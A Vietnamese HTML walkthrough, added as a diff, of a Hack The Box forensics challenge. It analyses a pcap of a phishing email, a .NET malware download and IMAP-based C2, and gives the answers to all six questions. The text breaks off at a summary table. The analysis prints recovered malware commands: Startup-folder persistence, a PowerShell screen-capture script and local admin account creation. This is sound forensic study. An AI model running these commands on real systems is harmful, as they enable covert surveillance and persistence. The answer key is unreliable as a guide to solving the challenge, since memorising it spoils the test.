@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hướng dẫn từng bước — Dead Sea Proto (Forensics CTF)</title>
+<style>
+  :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --fg:#e6edf3; --mut:#8b949e;
+          --acc:#58a6ff; --ok:#3fb950; --warn:#d29922; --bad:#f85149; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--fg);
+         font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; line-height:1.7; }
+  .wrap { max-width:940px; margin:0 auto; padding:32px 20px 90px; }
+  header.hero { border:1px solid var(--border); border-radius:12px; background:linear-gradient(135deg,#161b22,#1a2332);
+                 padding:28px 32px; margin-bottom:28px; }
+  header.hero h1 { margin:0 0 6px; font-size:1.7rem; }
+  header.hero .sub { color:var(--mut); }
+  .flag-box { margin-top:16px; border:1px solid var(--ok); border-radius:10px; background:#12261a; padding:14px 18px; }
+  .flag-box code { color:var(--ok); font-size:1.05rem; font-weight:700; }
+  h2 { color:var(--acc); border-bottom:1px solid var(--border); padding-bottom:8px; margin-top:52px; }
+  h3 { color:var(--fg); margin-top:32px; }
+  h4 { color:var(--acc); margin-top:22px; }
+  .card { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:18px 22px; margin:16px 0; }
+  code { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.88em;
+         background:#1c2128; border:1px solid var(--border); border-radius:5px; padding:2px 6px; color:#a5d6ff; }
+  pre { background:#0d1117; border:1px solid var(--border); border-radius:10px; padding:16px; overflow-x:auto;
+        color:#c9d1d9; line-height:1.6; font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.87em; }
+  pre code { background:none; border:none; padding:0; color:inherit; }
+  .cm { color:#7ee787; }
+  .kw { color:#ff7b72; }
+  .st { color:#a5d6ff; }
+  table { border-collapse:collapse; width:100%; margin:16px 0; font-size:.92em; }
+  th,td { border:1px solid var(--border); padding:9px 12px; text-align:left; vertical-align:top; }
+  th { background:#1c2128; }
+  .tag { display:inline-block; font-size:.75rem; font-weight:700; border-radius:20px; padding:2px 10px; margin-right:6px; }
+  .tag.ok { background:#12261a; color:var(--ok); border:1px solid var(--ok); }
+  .tag.bad { background:#2d1214; color:var(--bad); border:1px solid var(--bad); }
+  .tag.warn { background:#2a2110; color:var(--warn); border:1px solid var(--warn); }
+  .note { border-left:4px solid var(--warn); background:#211d12; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .tip { border-left:4px solid var(--ok); background:#12261a55; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .verify { border-left:4px solid var(--acc); background:#0d1a2b; padding:12px 16px; border-radius:0 8px 8px 0; margin:16px 0; }
+  .verify b:first-child { color:var(--acc); }
+  .muted { color:var(--mut); }
+  ol.steps > li, ul.dash > li { margin-bottom:8px; }
+  .toc a { color:var(--acc); text-decoration:none; }
+  .toc a:hover { text-decoration:underline; }
+  .spring { border:1px solid #6e7681; border-radius:10px; margin:16px 0; overflow:hidden; }
+  .spring .hd { background:#12324a; padding:8px 16px; font-weight:700; font-size:.9em; color:#79c0ff; }
+  .spring .bd { padding:4px 16px 14px; background:#0d1117; }
+  .spring.bad-ex .hd { background:#3d1d22; color:#ffa198; }
+  .ans { border-left:4px solid var(--ok); background:#12261a; padding:10px 16px; border-radius:0 8px 8px 0; margin:12px 0; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="hero">
+  <h1>🕵️ Dead Sea Proto — Phân tích pcap phishing + malware có C2 qua IMAP</h1>
+  <div class="sub">Challenge Forensics · Hack The Box (event 3692 — Intermediate) · <span class="muted">tài liệu: <code>capture.pcapng</code> (~2 MB, 10 217 gói tin)</span></div>
+  <div class="flag-box">
+    🏁 Bộ đáp án 6 câu hỏi (đã lấy được, <b>chưa nộp</b> — bạn tự submit từng câu trên portal):<br><br>
+    <table style="margin:0">
+      <tr><th>#</th><th>Câu hỏi</th><th>Đáp án</th></tr>
+      <tr><td>1</td><td>Subject của phishing email</td><td><code>Updated Instructions for VPN Connection – Please Read and Apply</code></td></tr>
+      <tr><td>2</td><td>Số recipients của phishing email</td><td><code>43</code> (10 hiển thị + “33 more”, không có Cc)</td></tr>
+      <tr><td>3</td><td>Email của nạn nhân mở email và tải malware</td><td><code>finance.branch8@sentinel.net</code></td></tr>
+      <tr><td>4</td><td>MD5 của malware (lowercase)</td><td><code>d1417810f33cb609ef7933c5f48ebb0c</code></td></tr>
+      <tr><td>5</td><td>Method attacker dùng để capture desktop</td><td><code>CopyFromScreen</code> — PowerShell chụp màn hình qua <code>System.Drawing.Graphics.CopyFromScreen</code></td></tr>
+      <tr><td>6</td><td>Title của leaked contract</td><td><code>LOAN AND SECURITY AGREEMENT</code> (file <code>Agreement_TechSepa.docx</code>)</td></tr>
+    </table>
+  </div>
+  <div class="card toc" style="margin-top:16px">
+    <b>Mục lục:</b><br>
+    <a href="#p0">Phần 0 — Khái niệm nền</a> ·
+    <a href="#p1">Phần 1 — Recon</a> ·
+    <a href="#p2">Phần 2 — Dead ends</a> ·
+    <a href="#p3">Phần 3 — Breakthrough</a> ·
+    <a href="#p4">Phần 4 — Kết liễu</a> ·
+    <a href="#p5">Phần 5 — Root cause</a> ·
+    <a href="#p6">Phần 6 — Checklist</a>
+  </div>
+</header>
+
+<p class="muted">Bài viết giả định bạn là lập trình viên Java/Spring Boot, chưa chuyên sâu forensics. Mọi khái niệm lạ (pcap, IMAP, MIME literal, DES-CBC, double extension…) đều được giải thích ở Phần 0 trước khi dùng. Mọi lệnh trong bài đều đã chạy thật với <code>tshark</code> (kèm theo Wireshark) trên macOS.</p>
+
+<h2 id="p0">Phần 0 — Kiến thức nền cần có trước khi bắt đầu</h2>
+
+<h3>0.1 — File pcap là gì và đọc bằng tshark</h3>
+<div class="card">
+<p><b>pcap/pcapng</b> là file “ghi hình” toàn bộ gói tin mạng: mỗi dòng là một frame với timestamp, IP nguồn/đích, protocol và payload. Nó tương tự file access log của Tomcat — nhưng chi tiết đến từng byte truyền đi, chứ không chỉ dòng log đã được server “làm sạch”.</p>
+<p><b>tshark</b> là phiên bản dòng lệnh của Wireshark. Ba việc ta làm liên tục:</p>
+<ul class="dash">
+  <li>Thống kê: <code>-q -z io,phs</code> cho biết có những giao thức nào, bao nhiêu frame.</li>
+  <li>Lọc: <code>-Y "filter"</code> — cú pháp giống ô filter của Wireshark GUI (<code>tcp.port == 143</code>, <code>http.request</code>, <code>frame.number == 9242</code>).</li>
+  <li>Xuất dữ liệu: <code>-T fields -e &lt;field&gt;</code> in các trường đã parse; <code>-V</code> in dissection đầy đủ của một frame.</li>
+</ul>
+</div>
+
+<h3>0.2 — Bảng các cờ tshark dùng xuyên suốt bài</h3>
+<div class="card">
+<table>
+  <tr><th>Cờ / field</th><th>Ý nghĩa</th><th>Tại sao dùng ở đây</th></tr>
+  <tr><td><code>-r capture.pcapng</code></td><td>Đọc file capture</td><td>Mọi lệnh đều bắt đầu từ file này</td></tr>
+  <tr><td><code>-Y "…"</code></td><td>Display filter (lọc sau khi đọc)</td><td>Chỉ giữ frame liên quan, tránh chết ngập trong 10 217 frame</td></tr>
+  <tr><td><code>-T fields -e tcp.payload</code></td><td>Xuất payload TCP dạng hex</td><td>Reassemble bằng tay khi Wireshark không tự parse được (IMAP literal dài)</td></tr>
+  <tr><td><code>-e tcp.stream</code></td><td>Chỉ số luồng TCP</td><td>Một “cuộc hội thoại” TCP = 1 stream; APPEND {217989} nằm ở stream 2679</td></tr>
+  <tr><td><code>--export-objects http,DIR -w /dev/null</code></td><td>Trích mọi file truyền qua HTTP ra đĩa</td><td>Lấy nguyên file malware tải về, nguyên HTML email… không cần tự nối gói</td></tr>
+  <tr><td><code>-q -z io,phs</code></td><td>Protocol Hierarchy Statistics</td><td>30 giây đầu: biết nên đào vào HTTP, IMAP hay DNS</td></tr>
+</table>
+</div>
+
+<h3>0.3 — IMAP, Roundcube và “kênh C2 qua Drafts”</h3>
+<div class="card">
+<p><b>IMAP</b> (port 143) là giao thức đọc thư: client gửi lệnh dạng text (<code>LOGIN</code>, <code>SELECT Drafts</code>, <code>UID FETCH …</code>, <code>APPEND INBOX {n}</code>), server trả text. <b>Roundcube</b> là webmail viết bằng PHP — trình duyệt nói chuyện với server qua HTTP, Roundcube nói chuyện với IMAP server hộ người dùng.</p>
+<p>Điểm mấu chốt của challenge: <b>malware dùng chính hộp thư làm kênh điều khiển (C2 — Command &amp; Control)</b>. Attacker đặt lệnh vào một email <i>nháp</i> (Draft) trên server; malware đăng nhập IMAP, tìm draft theo subject, đọc body = lệnh, thực thi, rồi <code>APPEND</code> kết quả ngược lại INBOX dưới dạng “report”. Traffic này đi qua port 143 — rất khác thường so với C2 kiểu HTTP beacon thông thường, nên dễ lọt qua firewall.</p>
+<p><b>MIME literal <code>{n}</code></b>: trong IMAP, khi gửi dữ liệu dài, client báo trước độ dài <code>{44389}</code>, server trả <code>+ OK</code>, client mới gửi tiếp đúng 43 389 byte. Đây là lý do blob base64 bị cắt ngang bởi chuỗi <code>\r\n+ OK\r\n</code> — khi reassemble phải xoá đoạn này.</p>
+</div>
+
+<h3>0.4 — Mã hoá DES-CBC và cấu trúc payload của challenge</h3>
+<div class="card">
+<p><b>DES</b> là mật mã khối 64-bit (8 byte) với khoá 8 byte, chế độ <b>CBC</b>: mỗi khối trước khi mã hoá được XOR với khối mã hoá trước nó; 8 byte đầu tiên của chuỗi là IV. DES đã lỗi thời vì khoá ngắn, nhưng malware vẫn dùng vì có sẵn trong .NET (<code>System.Security.Cryptography.DESCryptoServiceProvider</code>).</p>
+<p>Payload của challenge bọc <b>2 lớp</b> — ghi nhớ công thức này, Phần 3 và 4 dùng liên tục:</p>
+<pre><span class="cm"># chuỗi gửi đi (draft body, report body, message exfil) đều cùng 1 dạng:</span>
+wire   = base64( IV[8 byte] || DES-CBC(key, base64(plaintext)) )</pre>
+<p>Tức: gỡ base64 lần 1 → tách IV 8 byte → giải DES-CBC → được <i>chuỗi base64 khác</i> → gỡ base64 lần 2 → mới ra plaintext. Hai loại nội dung sau lớp DES thì khác nhau: lệnh C2 và kết quả cmd thường là <code>base64(plaintext)</code>, còn một số report lớn (tasklist, screenshot) là <code>plaintext thuần</code> — Phần 4 chỉ cách phân biệt bằng thực nghiệm.</p>
+</div>
+
+<h3>0.5 — Double extension và MD5</h3>
+<div class="card">
+<p><b>Double extension</b>: đặt tên file <code>VPN_LDAP_user_guide.pdf.exe</code> — Windows mặc định ẩn phần mở rộng đã biết nên nạn nhân chỉ thấy “…pdf”. Đây là kỹ thuật phishing kinh điển.</p>
+<p><b>MD5</b>: hàm băm 128-bit, thường trình bày 32 ký tự hex. Trên macOS: <code>md5 -q file</code>; trên Linux: <code>md5sum file</code>.</p>
+</div>
+
+<h2 id="p1">Phần 1 — Recon: bản đồ giao thức trong capture</h2>
+<p class="muted">Triết lý: trước khi giải mã bất cứ thứ gì, hãy trả lời “trong capture này có những cuộc hội thoại nào giữa những ai”.</p>
+
+<h3>1.1 — Thống kê giao thức: chọn đúng đường đào</h3>
+<pre><span class="cm"># -q: không in từng frame; -z io,phs: bảng thống kê protocol hierarchy</span>
+tshark -r capture.pcapng -q -z io,phs</pre>
+<pre>frame  frames:10217 bytes:1835077
+  tcp  frames:7903  bytes:1587985
+    http frames:268   bytes:179642   <span class="cm">← webmail Roundcube</span>
+      urlencoded-form frames:57 bytes:55430  <span class="cm">← POST gửi/nháp email</span>
+    imap frames:256   bytes:62469    <span class="cm">← kênh C2 của malware</span>
+      imf  frames:14
+    tls  frames:113   bytes:62475    <span class="cm">← hầu hết là Microsoft services, vô hại</span>
+  udp  …
+    dns  frames:106   bytes:14757
+    nbns frames:387   …             <span class="cm">← lộ tên máy qua NetBIOS</span></pre>
+<div class="verify"><b>✔ Cách verify:</b> thấy đúng 4 con số trên — đặc biệt <code>imap 256 frames</code> và <code>urlencoded-form 57 frames</code>. Nếu thiếu <code>imf 14</code> thì file capture đang bị lọc sai.</div>
+
+<h3>1.2 — Đọc lệnh IMAP: lộ tài khoản và mẫu hành vi</h3>
+<pre><span class="cm"># imap.request: phần lệnh client gửi lên (gạch đầu dòng $ là prompt của tshark)</span>
+tshark -r capture.pcapng -Y "imap.request" -T fields -e frame.number -e imap.request</pre>
+<pre>170  $ LOGIN sentinel.hsm@sentinel.net HsmSecure#45
+174  $ APPEND INBOX {441},From: n_admin,Subject: a___10/18/2025 1:03:20 PM_report_V0lOMT…
+179  $ APPEND INBOX {817},From: n_admin,Subject: a___10/18/2025 1:03:20 PM_report_V0lOMT…
+194  $ SELECT Drafts
+194  $ UID SEARCH subject "V0lOMTBfYWRtaW5fTWljcm9zb2Z0IFdpbmRvd3MgTlQgNi4yLjkyMDAuMA=="
+2894 $ UID FETCH 5 BODY.PEEK[text]      <span class="cm">← đọc body draft = đọc LỆNH C2</span>
+2929 $ APPEND INBOX {44389} …           <span class="cm">← gửi kết quả (report 43 KB)</span>
+… (lặp lại mỗi phút: SEARCH → FETCH → APPEND)
+9684 $ APPEND INBOX {217989}            <span class="cm">← report cuối, 218 KB!</span></pre>
+<div class="verify"><b>✔ Cách verify:</b> xuất hiện chu kỳ <code>UID SEARCH subject</code> → <code>UID FETCH … BODY.PEEK[text]</code> → <code>APPEND</code> lặp lại. Đây là chữ ký của malware poll-lệnh-qua-draft. Decode phần base64 trong subject: <code>V0lOMTBfYWRtaW5fTWljcm9zb2Z0IFdpbmRvd3MgTlQgNi4yLjkyMDAuMA==</code> → <code>WIN10_admin_Microsoft Windows NT 6.2.9200.0</code> — tức subject report chứa hostname/OS của máy nhiễm, cách đặt tên rất “malware”.</div>
+
+<h3>1.3 — HTTP: ai login webmail, mở email nào, tải gì</h3>
+<pre><span class="cm"># Liệt kê mọi HTTP request: method, host, uri — tìm dấu vết người dùng</span>
+tshark -r capture.pcapng -Y "http.request" -T fields \
+  -e frame.number -e frame.time_relative -e ip.src -e http.request.method -e http.host -e http.request.uri</pre>
+<p>Các request đáng chú ý trong danh sách 190 request:</p>
+<ul class="dash">
+  <li><code>POST /mail/?_task=login</code> — đúng 1 lần (frame 1705).</li>
+  <li><code>GET …&amp;_uid=1&amp;_mbox=INBOX&amp;_framed=1&amp;_action=preview</code> — mở email <b>uid=1</b> (frame preview).</li>
+  <li><code>GET …&amp;_mbox=INBOX&amp;_uid=1&amp;_part=2&amp;_download=1…</code> — tải <b>phần đính kèm số 2</b> của email uid=1. Đây là file malware.</li>
+  <li>8 lần <code>POST …_action=send</code> — dùng cho cả exfil (Phần 3).</li>
+</ul>
+<div class="verify"><b>✔ Cách verify:</b> <code>awk -F'\t' '{print $6}'</code> rồi <code>sort | uniq -c</code> — tổng đúng 190 request, trong đó có đúng 1 <code>_task=login</code>, 1 <code>_part=2&amp;_download=1</code>. Hai dòng cuối là dấu vết tối quan trọng của toàn bài.</div>
+
+<h3>1.4 — Export sạch mọi object HTTP</h3>
+<pre><span class="cm"># Trích mọi file truyền qua HTTP ra thư mục; -w /dev/null bắt buộc khi dùng --export-objects</span>
+tshark -r capture.pcapng --export-objects http,/tmp/dsp_objs -w /dev/null
+file /tmp/dsp_objs/*part=2*    <span class="cm"># xác định loại file attachment</span></pre>
+<pre>…_uid=1&_part=2&_download=1…: PE32 executable (GUI) Intel 80386 Mono/.Net assembly,
+                              for MS Windows (11264 bytes)</pre>
+<div class="verify"><b>✔ Cách verify:</b> file tải từ <code>_part=2</code> là <code>PE32 … Mono/.Net assembly</code>, 11 264 byte. “Mono/.Net assembly” = malware viết bằng .NET — quan trọng cho Phần 3.4 (trích strings UTF-16).</div>
+
+<h2 id="p2">Phần 2 — Các hướng trực diện (thất bại, và cách verify)</h2>
+<p class="muted">Forensics cũng như khai thác web: phải chứng minh đường tắt không đi được, trước khi đi đường vòng.</p>
+
+<h3>2.1 — <span class="tag bad">THẤT BẠI</span> Để Wireshark tự parse email (imf)</h3>
+<pre>tshark -r capture.pcapng -Y "imf" -T fields -e imf.subject -e imf.from -e imf.to</pre>
+<pre>2896  (rỗng)
+3498  (rỗng)
+… toàn bộ 14 dòng đều rỗng</pre>
+<p><b>Kết quả thật:</b> không trích được subject nào. <b>Vì sao:</b> Wireshark parse IMF theo chuẩn MIME — header phải bắt đầu ngay đầu phần thân. Nhưng các email trong capture nằm sau IMAP literal <code>{441}</code> dính liền dòng <code>From: n_admin</code> không theo chuẩn, dissector bỏ cuộc.</p>
+<p><b>Kết luận:</b> phải tự reassemble TCP stream và cắt header bằng tay.</p>
+
+<h3>2.2 — <span class="tag bad">THẤT BẠI</span> <code>--export-objects imf</code></h3>
+<pre>tshark -r capture.pcapng --export-objects imf,/tmp/imf_export -w /dev/null
+head -c 100 "/tmp/imf_export/(1).eml"</pre>
+<pre>7IGnUd3hcEsLux8rcQulENQVP5eiiU1zacbKsNoTXzvndtVB7q721YOfWIrL5/azzwzRH5l07bSCjeDMndjoaB9R2mNiplxDZNfuH/UgZv4=</pre>
+<p><b>Kết quả thật:</b> 14 file .eml toàn base64 vô nghĩa khi decode. <b>Vì sao:</b> export-objects chỉ xuất đúng phần Wireshark hiểu là MIME; phần còn lại rơi vào trạng thái lỗi. Dữ liệu thật (blob DES) không bị mất — chỉ là công cụ không gom đúng.</p>
+<p><b>Kết luận:</b> các file này vẫn dùng được — chúng chính là blob DES (Phần 3.5), chỉ cần giải mã tay. Đây là bài học: artifact “lỗi” của công cụ vẫn là evidence.</p>
+
+<h3>2.3 — <span class="tag bad">THẤT BẠI</span> Tìm chữ “contract” trong plaintext toàn bộ TCP</h3>
+<pre><span class="cm"># Dump toàn bộ TCP payload rồi grep tay — vài challenge giấu flag thẳng trong gói tin</span>
+tshark -r capture.pcapng -Y "tcp.len > 0" -T fields -e tcp.payload | tr -d '\n' \
+  | python3 -c "import sys,binascii; raw=binascii.unhexlify(sys.stdin.read()); print(raw.lower().count(b'contract'))"</pre>
+<pre>0</pre>
+<p><b>Kết luận:</b> contract không nằm ở dạng plaintext — bị mã hoá hoặc nằm trong ảnh. Chuyển sang giải mã.</p>
+
+<h3>2.4 — <span class="tag bad">THẤT BẠI</span> Đoán thuật toán là AES/RC4/3DES</h3>
+<pre><span class="cm"># Thử decrypt blob draft bằng mọi thuật toán phổ biến với chuỗi lạ w3BrhP&gt;2 làm khoá</span>
+AES-128 (khoá = md5(pw)), AES-256, RC4, 3DES, RC2 → toàn bộ output là byte rác</pre>
+<p><b>Kết luận:</b> phải đọc metadata của binary trước (Phần 3.4) thay vì đoán mò thuật toán.</p>
+
+<h3>2.5 — <span class="tag bad">THẤT BẠI</span> Report 43 KB không phải contract</h3>
+<pre><span class="cm"># Giải mã APPEND {44389} (stream 665) → thấy plaintext thuần:</span>
+C:\Users\admin\Downloads&gt;tasklist /v
+Image Name   PID Session Name …</pre>
+<p><b>Kết luận:</b> đây chỉ là output của <code>tasklist /v</code> (recon của attacker về process/window đang mở). Contract nằm ở report cuối cùng.</p>
+
+<h2 id="p3">Phần 3 — Đột phá: đọc email phishing + trích khoá từ binary</h2>
+
+<h3>3.1 — Subject của phishing email (câu 1)</h3>
+<p>Mở file object của preview uid=1 đã export ở bước 1.4:</p>
+<pre><span class="cm"># Tiêu đề trang preview của Roundcube chính là subject email</span>
+grep -o '&lt;title&gt;[^&lt;]*' "…_uid=1…_action=preview"</pre>
+<pre>&lt;title&gt;Roundcube Webmail :: Updated Instructions for VPN Connection – Please Read and Apply&lt;/title&gt;</pre>
+<p>Bỏ tiền tố “Roundcube Webmail :: ” → subject. Lưu ý dấu “–” trong đề là <b>en-dash</b> (U+2013), không phải gạch ngang “-” hay 3 chấm “…” — khi nhập đáp án cần giữ nguyên.</p>
+<div class="verify"><b>✔ Cách verify:</b> chuỗi xuất hiện ngay đầu file preview, trước mọi thẻ script. Đối chiếu thêm: danh sách INBOX (15 email) toàn subject <code>a___…_report_…</code> — chỉ có uid=1 là email “bình thường”.</div>
+
+<h3>3.2 — Nạn nhân và tên file malware (câu 3 + manh mối)</h3>
+<p>Cùng file preview, đọc phần header và phần môi trường JS:</p>
+<pre><span class="cm"># username trong session webmail = chủ tài khoản đang mở email</span>
+grep -o '"username":"[^"]*' "…_uid=1…_action=preview"
+<span class="cm"># tên attachment hiển thị cho người dùng</span>
+grep -o 'attachment-name[^&gt;]*&gt;[^&lt;]*' "…_uid=1…_action=preview"</pre>
+<pre>"username":"finance.branch8@sentinel.net"
+VPN_LDAP_user_guide.pdf.exe</pre>
+<div class="verify"><b>✔ Cách verify:</b> hai giá trị trên cùng nằm trong một response duy nhất (preview uid=1) — username là người sở hữu phiên webmail đã GET download ở bước 1.3, attachment là đúng <code>_part=2</code> đã tải. Double extension <code>.pdf.exe</code> khớp mô típ phishing trong email body (“download and follow the attached step-by-step guide: VPN_LDAP_user_guide.pdf”).</div>
+<div class="note">⚠ Hồ sơ <code>sentinel.hsm@sentinel.net</code> xuất hiện cả ở From của email phishing lẫn LOGIN IMAP ở máy khác (<code>192.168.239.132</code>, User-Agent Windows NT 6.1) — đó là tài khoản attacker/hệ thống gửi, <b>không phải</b> nạn nhân. Nạn nhân là máy <code>192.168.239.128</code> (Windows NT 10.0) login webmail với <code>finance.branch8@sentinel.net</code>.</div>
+
+<h3>3.3 — Đếm recipients (câu 2)</h3>
+<p>Roundcube chỉ hiển thị 10 địa chỉ đầu trong To, phần còn lại gom vào link “more”:</p>
+<pre><span class="cm"># Header row trong preview: To … "33 more…" — không có hàng Cc</span>
+grep -o 'header-title"&gt;[^&lt;]*' "…_uid=1…_action=preview"   <span class="cm">→ From, To, Date (KHÔNG có Cc)</span>
+grep -o '33 more' "…_uid=1…_action=preview"              <span class="cm">→ xác nhận còn 33 địa chỉ ẩn</span></pre>
+<p>To = 10 hiển thị + 33 more = <b>43</b>. Đối chiếu chéo: file preview chứa 44 địa chỉ <code>mailto:…@sentinel.net</code> duy nhất, trừ 1 địa chỉ From (sentinel.hsm) → 43 = To.</p>
+<div class="verify"><b>✔ Cách verify:</b> hai phép tính độc lập cùng ra 43: (a) 10 + 33 từ UI, (b) 44 mailto unique − 1 From. Header không có mục Cc (liệt kê <code>header-title</code> chỉ thấy From/To/Date).</div>
+
+<h3>3.4 — MD5 malware (câu 4) và trích khoá DES từ binary</h3>
+<pre><span class="cm"># Hash file đã export ở bước 1.4 (macOS dùng md5, Linux dùng md5sum)</span>
+md5 -q "…_part=2&_download=1…"</pre>
+<pre>d1417810f33cb609ef7933c5f48ebb0c</pre>
+<pre><span class="cm"># .NET lưu string dạng UTF-16LE — strings ASCII thường bỏ sót, phải đọc UTF-16</span>
+python3 -c "
+import re
+data = open('malware.exe','rb').read()
+for s in re.findall(rb'(?:[\x20-\x7e]\x00){4,}', data):
+    print(s.decode('utf-16le'))"</pre>
+<pre>$ LOGIN
+$ SELECT
+$ UID FETCH  BODY.PEEK[text]
+From: n_
+Subject: a___
+_report_
+$ APPEND INBOX {
+cmd.exe
+move /Y igmtSX.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\igmtSX.exe"
+w3BrhP&gt;2                                                    <span class="cm">← chuỗi 8 byte = khoá DES</span>
+sentinel.hsm@sentinel.net:HsmSecure#45:mail.sentinel.net:000…  <span class="cm">← config C2 (IMAP)</span>
+InternalName: igmtSX.exe</pre>
+<div class="verify"><b>✔ Cách verify:</b> 4 điểm khớp nhau — (1) chuỗi <code>w3BrhP&gt;2</code> đúng 8 byte = kích thước khoá DES; (2) strings metadata chứa <code>DESCryptoServiceProvider / CreateDecryptor / CryptoStream / ToBase64String / encryptKey</code>; (3) config IMAP khớp chính tài khoản thấy ở bước 1.2; (4) lệnh persistence (copy vào Startup) khớp output cmd đã thấy trong report giải mã thử nghiệm.</div>
+
+<h3>3.5 — Giải mã lệnh C2 (xác nhận khoá)</h3>
+<pre><span class="cm"># Script giải mã chuỗi 2 lớp: base64 → DES-CBC(key=w3BrhP&gt;2, iv=8B đầu) → base64</span>
+python3 &lt;&lt;'EOF'
+import base64
+from Crypto.Cipher import DES
+def dec(b64):
+    blob = base64.b64decode(b64)
+    out = DES.new(b'w3BrhP>2', DES.MODE_CBC, blob[:8]).decrypt(blob[8:])
+    pad = out[-1]
+    if 0 &lt; pad &lt;= 8: out = out[:-pad]
+    return out
+inner = dec('fwkFX0HrScpEPqjy98HqkpSjhIOL4sgG')   <span class="cm"># body draft uid=5</span>
+print(base64.b64decode(inner))                    <span class="cm"># lớp 2 là base64</span>
+EOF</pre>
+<pre>st /v          (phần cuối của "netstat /v" — blob 24 byte chỉ là đoạn cuối lệnh)</pre>
+<p>Blob (13).eml — dài hơn, cho thấy lệnh đầy đủ (dùng để trả câu 5 ở Phần 4):</p>
+<pre>powershell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing;
+$s=[System.Windows.Forms.SystemInformation]::VirtualScreen; $b=New-Object System.Drawing.Bitmap $s.Width,$s.Height;
+$g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.Left,$s.Top,0,0,$b.Size);
+$m=New-Object IO.MemoryStream; $b.Save($m,[Drawing.Imaging.ImageFormat]::Png);
+[Convert]::ToBase64String($m.ToArray())"</pre>
+<div class="verify"><b>✔ Cách verify:</b> output là chữ ASCII đọc được (không còn byte rác như Phần 2.4) → khoá <code>w3BrhP&gt;2</code> và thuật toán DES-CBC đã đúng. Mọi blob trong thư mục imf_export giải mã cùng công thức đều ra lệnh cmd/powershell hợp lệ: <code>net user adminbackup … /add</code>, <code>wmic os get Caption,…</code>, <code>netstat /v</code>, <code>New-LocalUser …</code>…</div>
+
+<h2 id="p4">Phần 4 — Kết liễu: report 218 KB và tấm ảnh chụp màn hình</h2>
+
+<h3>4.1 — Reassemble và giải mã APPEND {217989}</h3>
+<p>Report cuối (frame 9684, stream 2679) dài 217 989 byte — quá lớn cho text cmd, đúng kích thước một ảnh PNG base64. Reassemble tay:</p>
+<pre><span class="cm"># 1) Dump toàn bộ payload của stream 2679 (hex nối liền)</span>
+tshark -r capture.pcapng -Y "tcp.stream == 2679 &amp;&amp; tcp.len &gt; 0" -T fields -e tcp.payload | tr -d '\n' &gt; /tmp/s9684.hex
+
+<span class="cm"># 2) Python: nối hex → decode → xoá phản hồi "+ OK" chen giữa literal → base64 → DES</span>
+python3 &lt;&lt;'EOF'
+import binascii, re, base64
+from Crypto.Cipher import DES
+raw  = binascii.unhexlify(open('/tmp/s9684.hex').read())
+body = raw[raw.find(b'APPEND INBOX {217989}'):]
+body = body[body.find(b'\r\n\r\n')+4:]
+clean = re.sub(rb'\r\n\+ OK\r\n', b'', body).split(b'\r\n$ ')[0]
+clean = re.sub(rb'\s', b'', clean)[: -len(clean) % 4 or None][: len(re.sub(rb'\s','',clean))//4*4]
+blob = base64.b64decode(clean)
+iv, ct = blob[:8], blob[8: len(blob)//8*8]
+pt = DES.new(b'w3BrhP&gt;2', DES.MODE_CBC, iv).decrypt(ct)
+k = pt.find(b'iVBORw0K')          <span class="cm"># magic base64 của PNG: 89 50 4E 47</span>
+run = re.match(rb'([A-Za-z0-9+/=]+)', pt[k:]).group(1)
+png = base64.b64decode(run[: len(run)//4*4])
+open('screen.png','wb').write(png)
+print(len(png), png[:8])
+EOF</pre>
+<pre>46311 b'\x89PNG\r\n\x1a\n'</pre>
+<div class="verify"><b>✔ Cách verify:</b> output <code>46311 b'\x89PNG\r\n\x1a\n'</code> — magic PNG chuẩn, <code>file screen.png</code> → <code>PNG image data, 1718 x 928, 8-bit/color RGBA</code>. Trước magic <code>iVBORw0K</code> trong pt còn nguyên lệnh powershell CopyFromScreen — chứng cứ xuyên suốt từ lệnh (Phần 3.5) tới ảnh.</div>
+<div class="note">⚠ Hai điểm kỹ thuật dễ vấp: (1) phải xoá <code>\r\n+ OK\r\n</code> — phản hồi IMAP giữa literal chen vào giữa blob; (2) phần cuối base64 thường thiếu do capture drop gói — cắt run về bội số của 4, ảnh vẫn mở được (PNG chỉ cần đủ header + phần lớn dữ liệu).</div>
+
+<h3>4.2 — Đọc ảnh: hai câu cuối</h3>
+<p>Mở <code>screen.png</code>:</p>
+<ul class="dash">
+  <li>Thanh title của cửa sổ Word: <code>Agreement_TechSepa.docx - Word</code>.</li>
+  <li>Heading đầu tài liệu (to, đậm, đúng nghĩa “title” của hợp đồng): <code>LOAN AND SECURITY AGREEMENT</code>. Nội dung: Party A “Sentinel Financial Group, LLC” — Party B “TechSepa Solutions Inc.”, ngày hiệu lực October 20, 2025.</li>
+</ul>
+<div class="ans">✅ <b>Câu 5</b> — Method capture desktop: <code>CopyFromScreen</code> (chụp màn hình bằng PowerShell <code>System.Drawing.Graphics.CopyFromScreen</code>, xuất PNG → base64 qua console).</div>
+<div class="ans">✅ <b>Câu 6</b> — Title contract: <code>LOAN AND SECURITY AGREEMENT</code> — tên file trên title bar là <code>Agreement_TechSepa.docx</code> (đáp án phụ nếu portal không nhận dạng heading).</div>
+<div class="verify"><b>✔ Cách verify:</b> ảnh PNG mở được, dimension 1718×928; đối chiếu với lệnh đã giải mã ở 3.5 — <code>$b.Save($m,[Drawing.Imaging.ImageFormat]::Png); [Convert]::ToBase64String(…)</code> khớp hoàn toàn pipeline “chụp → PNG → base64 → console → malware đọc stdout → APPEND”.</div>
+
+<h3>Bảng tổng kết chuỗi phân tích</h3>
+<table>
+  <tr><th>#</th><th>Câu hỏi</th><th>Đáp án</th><th>Dựa vào</th><th>Verify bằng</th></tr>
